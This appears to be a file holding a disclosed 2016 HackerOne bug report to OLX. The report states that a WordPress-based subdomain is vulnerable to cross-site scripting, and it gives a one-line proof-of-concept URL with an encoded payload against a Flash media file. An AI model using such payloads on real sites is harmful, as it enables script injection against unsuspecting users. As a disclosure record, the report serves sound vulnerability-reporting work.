@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/150565
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/thezawad
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.07.2016 14:46:37
+
+Summary:
+
+Hey,
+Just found your site yaman.olx.ph vulnerable to XSS probably because you're still using an unpatched wordpress version.
+
+**PoC**
+http://yaman.olx.ph/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert%60xss%20by%20zawad%60
+
+Hope you resolve it!
